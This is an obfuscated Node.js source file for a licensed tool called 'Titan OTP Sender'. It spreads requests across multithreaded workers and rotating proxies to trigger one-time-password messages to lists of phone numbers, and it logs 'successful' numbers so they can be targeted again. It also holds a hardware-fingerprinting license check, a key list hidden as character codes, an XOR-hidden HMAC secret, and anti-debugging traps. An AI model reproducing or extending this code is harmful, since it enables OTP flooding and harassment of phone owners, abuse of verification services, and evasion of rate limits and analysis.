          if (fs.existsSync('/proc/cpuinfo')) {
            const _kd = fs.readFileSync('/proc/cpuinfo', 'utf8'), match2 = _kd.match(/Serial\s*:\s*(\S+)/i), match3 = _kd.match(/Hardware\s*:\s*(.+)/i);
            if (match2 && match2[1] !== '0000000000000000')
              arr19.push('S:' + match2[1].trim());
            if (match3)
              arr19.push('H:' + match3[1].trim());
          }
        } catch (err12) {
        }
        try {
          if (fs.existsSync('/etc/machine-id')) {
            const _ld = fs.readFileSync('/etc/machine-id', 'utf8').trim();
            if (_ld)
              arr19.push('M:' + _ld);
          }
        } catch (err13) {
        }
        try {
          const _md = _fd.cpus(), _nd = _md && _md.length > 0 ? _md[0].model : 'UnknownCPU', _od = _fd.totalmem(), _pd = _fd.release(), _qd = _fd.hostname();
          arr19.push('F:' + _nd + '|' + _od + '|' + _pd + '|' + _qd);
        } catch (err14) {
        }
        const _rd = arr19.join('||'), _sd = crypto.createHash('sha256').update(_rd).digest('hex').toUpperCase();
        return 'IZENHSX-7BA3FB09-723F-A500';
      }
    } catch (err15) {
      return '';
    }
  }
  function verifyKeySig(_td, _ud) {
    const arr20 = [
      25,
      55,
      40,
      60,
      43,
      49,
      62,
      40,
      126,
      51,
      33,
      105,
      60,
      41,
      55,
      46
    ];
    const _vd = arr20.map(item5 => String.fromCharCode(item5 ^ 90)).join('');
    if (!_ud.sig)
      return false;
    const _wd = _td + '|' + (_ud.user || '') + '|' + (_ud.expires || ''), _xd = crypto.createHmac('sha256', _vd).update(_wd).digest('hex');
    return _xd === _ud.sig;
  }
  async function start() {
    const _yd = generateHWID.toString();
    const _zd = crypto.createHash('md5').update(_yd).digest('hex'), _Ad = generateHWID();
    !_Ad && (console.error(R('\n  \u2717 Could not generate Hardware ID. Run on Windows.\n')), process.exit(1));
    const _Bd = generateHWID();
    if (_Bd !== _Ad) {
      console.error(R('\n  \u2717 HWID integrity check failed. Tampering detected.\n'));
      process.exit(1);
    }
    printHeader();
    console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
    console.log(W('\u2502 [\u2022] Tool      : ') + B('Titan OTP Sender             ') + W('\u2502'));
    console.log(W('\u2502 [\u2022] Your HWID : ') + C(_Ad.padEnd(29)) + W('\u2502'));
    console.log(W('\u2502 [\u2022] Status    : ') + Y('Verifying License...         ') + W('\u2502'));
    console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518'));
    console.log('');
    let _Cd = false, _Dd = '';
    try {
      const promise = await new Promise((resolve7, reject4) => {
        const arr21 = [
            104,
            116,
            116,
            112,
            115,
            58,
            47,
            47,
            103,
            105,
            115,
            116,
            46,
            103,
            105,
            116,
            104,
            117,
            98,
            117,
            115,
            101,
            114,
            99,
            111,
            110,
            116,
            101,
            110,
            116,
            46,
            99,
            111,
            109,
            47
          ], arr22 = [
            115,
            99,
            114,
            97,
            112,
            101,
            114,
            107,
            105,
            110,
            103,
            57,
            57,
            47
          ], arr23 = [
            100,
            50,
            51,
            49,
            50,
            56,
            54,
            97,
            50,
            100,
            50,
            51,
            101,
            49,
            55,
            48,
            54,
            97,
            50,
            98,
            52,
            100,
            49,
            48,
            52,
            55,
            56,
            99,
            51,
            55,
            49,
            98,
            47,
            114,
            97,
            119,
            47,
            107,
            101,
            121,
            115,
            46,
            106,
            115,
            111,
            110
          ];
        const _Ed = arr21.map(item6 => String.fromCharCode(item6)).join('') + arr22.map(item7 => String.fromCharCode(item7)).join('') + arr23.map(item8 => String.fromCharCode(item8)).join(''), opts128 = {};
        opts128.timeout = 15000;
        https.get(_Ed + ('?t=' + Date.now()), opts128, _Fd => {
          let _Gd = '';
          _Fd.on('data', _Hd => _Gd += _Hd);
          _Fd.on('end', () => {
            try {
              resolve7(JSON.parse(_Gd));
            } catch (err16) {
              reject4(err16);
            }
          });
        }).on('error', reject4).on('timeout', function () {
          this.destroy();
          reject4(new Error('Timeout'));
        });
      });
      if (promise && promise.keys) {
        const _Id = promise.keys[_Ad];
        if (!_Id) {
          const parts8 = '5|0|4|6|2|1|7|3'.split('|');
          let _Jd = 0;
          while (true) {
            switch (parts8[_Jd++]) {
            case '0':
              console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 TITAN TOOL     \u2551'));
              continue;
            case '1':
              console.error(R('  \u2551  Contact: t.me/aizentools to register     \u2551'));
              continue;
            case '2':
              console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
              continue;
            case '3':
              process.exit(1);
              continue;
            case '4':
              console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
              continue;
            case '5':
              console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
              continue;
            case '6':
              console.error(R('  \u2551  HWID   : ') + Y(_Ad.padEnd(33)) + R('\u2551'));
              continue;
            case '7':
              console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
              continue;
            }
            break;
          }
        }
        if (!verifyKeySig(_Ad, _Id)) {
          console.error(R('\n  \u2717 License key signature invalid. Forged key detected.\n'));
          process.exit(1);
        }
        _Cd = true;
        _Dd = _Id.user || 'Licensed';
      }
    } catch (err17) {
      console.error(R('\n  \u2717 License server unreachable. Internet connection required.\n'));
      process.exit(1);
    }
    let _Kd = process.argv.slice(2), _Ld = null;
    if (_Kd.length === 0) {
      const _Md = await interactiveWizard();
      _Kd = [
        _Md.numbersFile,
        _Md.threads,
        _Md.proxiesFile,
        _Md.browser
      ];
      _Ld = _Md.nexaConfig;
    }
    let _Nd = path.resolve(_Kd[0] || 'numbers.txt'), _Od = parseInt(_Kd[1]) || 10, _Pd = _Kd[2] !== undefined ? _Kd[2] : 'proxies.txt';
    if (_Pd.toLowerCase() === 'none')
      _Pd = '';
    let _Qd = _Kd[3] || 'random';
    printHeader();
    console.log(B('  \u2713 License: ' + _Dd) + G(' | HWID: ' + _Ad));
    let _Rd = true;
    while (_Rd) {
      let arr24 = [];
      if (!_Ld) {
        if (!fs.existsSync(_Nd)) {
          console.error(R('\u2717 Error: Numbers file not found: ' + _Nd));
          process.exit(1);
        }
        arr24 = fs.readFileSync(_Nd, 'utf8').split(/\r?\n/).map(item9 => item9.trim()).filter(item10 => item10.length > 5);
      }
      let arr25 = [];
      _Pd && fs.existsSync(_Pd) && (arr25 = fs.readFileSync(_Pd, 'utf8').split('\n').map(item11 => item11.trim()).filter(item12 => item12.length > 0));
      let arr26 = [];
      for (const _Sd of arr25) {
        const _Td = parseProxy(_Sd);
        if (!_Td) {
          const parts9 = '3|0|1|2|6|4|5'.split('|');
          let _Ud = 0;
          while (true) {
            switch (parts9[_Ud++]) {
            case '0':
              console.error(R('  Please use one of the supported formats:'));
              continue;
            case '1':
              console.error(R('    - host:port'));
              continue;
            case '2':
              console.error(R('    - user:pass@host:port'));
              continue;
            case '3':
              console.error(R('\n  \u2717 Invalid proxy format detected: "' + _Sd + '"'));
              continue;
            case '4':
              console.error(R('    - user:pass:host:port\n'));
              continue;
            case '5':
              process.exit(1);
              continue;
            case '6':
              console.error(R('    - host:port:user:pass'));
              continue;
            }
            break;
          }
        }
        arr26.push(_Td);
      }
      if (_Ld) {
        console.log(C('\u2713 Target  : NexaOTP API (' + _Ld.totalCount + ' numbers)'));
      } else
        console.log(Y('\u2713 Loaded ' + arr24.length + ' targets'));
      if (arr26.length === 0)
        console.log(G('  No proxies configured (running direct)'));
      else
        console.log(G('  Proxies loaded: ' + arr26.length));
      console.log(C('\u2713 Threads: ' + _Od));
      console.log(C('\u2713 Browser: ' + _Qd));
      console.log(C('\u2713 Country: Auto-detect from phone prefix\n'));
      fs.writeFileSync(SUCCESSFUL_FILE, '');
      fs.writeFileSync(FAILED_FILE, '');
      fs.writeFileSync(DEBUG_FILE, '=== DEBUG SESSION ' + new Date().toISOString() + ' ===\n');
      const dashboard = new Dashboard(_Ld ? _Ld.totalCount : arr24.length);
      let arr27 = [], arr28 = [], _Vd = 0, _Wd = false;
      _Ld && (async () => {
        try {
          for (let _Xd = 0; _Xd < _Ld.totalCount; _Xd++) {
            try {
              const _Yd = _Ld.ranges[Math.floor(Math.random() * _Ld.ranges.length)], _Zd = await nexaLimiter.enqueue(() => nexaFetchNumber(_Ld.apiKey, _Yd, _Ld.serverEndpoint));
              _Zd && (_Vd++, arr28.length > 0 ? arr28.shift()(_Zd) : arr27.push(_Zd));
            } catch (err18) {
              if (err18.message.includes('Insufficient balance') || err18.message.includes('No numbers available'))
                break;
            }
          }
        } finally {
          _Wd = true;
          while (arr28.length > 0)
            arr28.shift()(null);
        }
      })();
      const _ae = _Ld ? () => {
          if (arr27.length > 0)
            return Promise.resolve(arr27.shift());
          if (_Wd)
            return Promise.resolve(null);
          return new Promise(resolve8 => arr28.push(resolve8));
        } : () => {
          if (arr24.length === 0)
            return Promise.resolve(null);
          const _be = Math.floor(Math.random() * arr24.length);
          return Promise.resolve(arr24.splice(_be, 1)[0]);
        }, _ce = () => {
          if (arr26.length === 0)
            return null;
          const _de = arr26[Math.floor(Math.random() * arr26.length)];
          return rotateSessionId(_de);
        };
      function _ee(_fe) {
        try {
          const _ge = fs.readFileSync(_Nd, 'utf8'), _he = _ge.split(/\r?\n/).filter(item13 => item13.trim() !== _fe.trim()).join('\n');
          fs.writeFileSync(_Nd, _he);
        } catch (err19) {
        }
      }
      const _ie = _Ld ? Math.min(_Od, _Ld.totalCount) : Math.min(_Od, arr24.length), arr29 = [], _je = setInterval(() => dashboard.render(), 500);
      async function _ke(_le) {
        while (true) {
          const _me = await _ae();
          if (!_me)
            break;
          try {
            const _ne = await triggerOTP(_me, {
              'onStatus': _oe => dashboard.setStatus('Worker ' + _le + ': ' + _oe),
              'proxy': _ce(),
              'workerId': _le,
              'browserPref': _Qd
            });
            if (_ne.success) {
              const parts10 = '3|1|4|0|2'.split('|');
              let _pe = 0;
              while (true) {
                switch (parts10[_pe++]) {
                case '0':
                  fs.appendFileSync(SUCCESSFUL_FILE, _ne.phone + '|OTP_SENT|' + _ne.email + '\n');
                  continue;
                case '1':
                  dashboard.processed++;
                  continue;
                case '2':
                  dashboard.addLog('Triggered OTP for ' + _ne.phone, 'success');
                  continue;
                case '3':
                  dashboard.successful++;
                  continue;
                case '4':
                  _ee(_me);
                  continue;
                }
                break;
              }
            } else {
              dashboard.failed++;
              dashboard.processed++;
              fs.appendFileSync(FAILED_FILE, _ne.phone + '|' + _ne.message + '\n');
              dashboard.addLog('Failed on ' + _ne.phone + ': ' + _ne.message, 'error');
            }
          } catch (err20) {
            dashboard.failed++;
            dashboard.processed++;
            dashboard.addLog('Fatal error on ' + _me + ': ' + err20.message, 'error');
          }
        }
      }
      for (let _qe = 0; _qe < _ie; _qe++)
        arr29.push(_ke(_qe));
      await Promise.all(arr29);
      clearInterval(_je);
      dashboard.render();
      dashboard.stop();
      const _re = await selectOption('Processing Complete. What next?', [
        {
          'name': 'Reuse successful numbers (' + SUCCESSFUL_FILE + ')',
          'value': 'reuse'
        },
        {
          'name': 'Go Home (Restart)',
          'value': 'home'
        },
        {
          'name': 'Exit',
          'value': 'exit'
        }
      ]);
      if (_re === 'reuse') {
        if (fs.existsSync(SUCCESSFUL_FILE)) {
          let _se = fs.readFileSync(SUCCESSFUL_FILE, 'utf8').split('\n').map(item14 => item14.split('|')[0].trim()).filter(item15 => item15.length > 5);
          fs.writeFileSync(_Nd, _se.join('\n'));
          fs.writeFileSync(SUCCESSFUL_FILE, '');
          console.log('\n  \x1B[32m\u2713 Copied ' + _se.length + ' successful numbers to ' + _Nd + ' and cleared ' + SUCCESSFUL_FILE + '.\x1B[0m\n');
        } else
          console.log('\n  \x1B[31m\u2717 No successful numbers found.\x1B[0m\n'), _Rd = false;
      } else {
        if (_re === 'home') {
          const _te = await interactiveWizard();
          _Kd = [
            _te.numbersFile,
            _te.threads,
            _te.proxiesFile,
            _te.browser
          ];
          _Ld = _te.nexaConfig;
          _Nd = path.resolve(_Kd[0] || 'numbers.txt');
          _Od = parseInt(_Kd[1]) || 10;
          _Pd = _Kd[2] !== undefined ? _Kd[2] : 'proxies.txt';
          if (_Pd.toLowerCase() === 'none')
            _Pd = '';
          _Qd = _Kd[3] || 'random';
        } else
          _Rd = false;
      }
    }
  }
  start().catch(err22 => {
    console.error(R('Fatal error: ' + err22.message));
    process.exit(1);
  });
}
function _o(_ue) {
  function _ve(_we) {
    if (typeof _we === 'string')
      return function (_xe) {
      }.constructor('while (true) {}').apply('counter');
    else
      ('' + _we / _we).length !== 1 || _we % 20 === 0 ? function () {
        return true;
      }.constructor('debu' + 'gger').call('action') : function () {
        return false;
      }.constructor('debu' + 'gger').apply('stateObject');
    _ve(++_we);
  }
  try {
    if (_ue) {
      return _ve;
    } else
      _ve(0);
  } catch (err21) {
  }
}